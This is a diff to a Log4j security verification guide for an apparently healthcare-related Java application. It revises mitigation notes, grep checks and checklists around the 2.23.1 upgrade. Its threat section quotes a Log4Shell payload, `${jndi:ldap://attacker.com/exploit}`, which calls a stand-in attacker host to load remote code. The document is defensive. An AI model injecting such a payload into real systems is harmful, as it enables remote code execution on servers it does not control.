@@ -44,15 +44,7 @@ This document provides comprehensive verification for Log4j security fixes imple
 ```
 
 **After (Secure)**:
-```xml
-<Configuration status="WARN" shutdownHook="disable">
-    <Properties>
-        <Property name="log4j2.formatMsgNoLookups">true</Property>
-        <Property name="log4j2.enableJndiLookup">false</Property>
-        <Property name="log4j2.enableJndiJms">false</Property>
-        <Property name="log4j2.enableJndiContextSelector">false</Property>
-    </Properties>
-```
+Upgrading to Log4j 2.23.1 disables JNDI lookups by default, which is the primary mitigation for Log4Shell. The properties previously in `log4j2.xml` were removed as they are ineffective in that file and redundant with the version upgrade.
 
 ### **3. Healthcare Audit Logging Enhancement**
 **Added**:
@@ -84,20 +76,19 @@ grep -A 5 -B 5 "log4j" pom.xml
 # Expected: Version 2.23.1 for all Log4j dependencies
 
 # Check for vulnerable versions
-grep -r "3.0.0-alpha1\|2.1[0-6]\|1\." pom.xml | grep log4j
+grep -C 5 -E "log4j.*(3\.0\.0-alpha1|2\.1[0-6]\.[0-9]+)" pom.xml
 # Expected: No results (no vulnerable versions)
 ```
 
 ### **Configuration Security**
 ```bash
-# Verify JNDI protection
-grep -i "jndi\|lookup" src/main/resources/log4j2.xml
-# Expected: All JNDI features disabled
-
-# Check security properties
-grep -A 10 "Properties" src/main/resources/log4j2.xml
-# Expected: Security properties configured
+# Verify JNDI protection is not explicitly enabled
+grep -i "jndi" src/main/resources/log4j2.xml
+# Expected: No results or features explicitly set to false.
 ```
+
+### **Application Server Classpath Check**
+To ensure the application server (e.g., GlassFish) does not provide a conflicting Log4j version, check the server's library directories for older Log4j jars (e.g., `log4j-1.x.x.jar`). Remove any such jars to prevent classpath conflicts.
 
 ### **Healthcare Compliance**
 ```bash
@@ -113,7 +104,7 @@ grep "PharmacyBean" src/main/resources/log4j2.xml
 ## 📋 **Testing Checklist**
 
 ### **✅ Security Verification**
-- [ ] **Log4Shell Protection**: JNDI lookups disabled in configuration
+- [ ] **Log4Shell Protection**: JNDI lookups disabled by default in version 2.23.1
 - [ ] **Version Security**: All Log4j dependencies at secure versions (2.23.1)
 - [ ] **Configuration Security**: No vulnerable appenders or patterns
 - [ ] **Injection Prevention**: Message lookups disabled
@@ -148,7 +139,7 @@ grep "PharmacyBean" src/main/resources/log4j2.xml
 
 ### **1. Log4Shell Remote Code Execution**
 **Attack**: `${jndi:ldap://attacker.com/exploit}` in log messages
-**Prevention**: JNDI lookups completely disabled in configuration
+**Prevention**: JNDI lookups completely disabled by default in Log4j 2.23.1.
 
 ### **2. Information Disclosure**
 **Attack**: Log message manipulation to expose sensitive data
@@ -162,7 +153,7 @@ grep "PharmacyBean" src/main/resources/log4j2.xml
 
 ### **Security Best Practices Applied**
 1. **Latest Stable Version**: Log4j 2.23.1 (not alpha/beta)
-2. **JNDI Protection**: All JNDI features explicitly disabled
+2. **JNDI Protection**: All JNDI features explicitly disabled by default
 3. **Secure Configuration**: No vulnerable appenders or patterns
 4. **Healthcare Compliance**: HIPAA-compliant audit logging
 
@@ -176,7 +167,7 @@ grep "PharmacyBean" src/main/resources/log4j2.xml
 
 ### **Pre-Deployment Checklist**
 - [ ] **Dependency Verification**: All Log4j versions at 2.23.1
-- [ ] **Configuration Security**: JNDI protection enabled
+- [ ] **Configuration Security**: JNDI protection verified
 - [ ] **Log Directory**: Ensure logs/ directory exists and is writable
 - [ ] **Audit Compliance**: Verify audit logging configuration
 
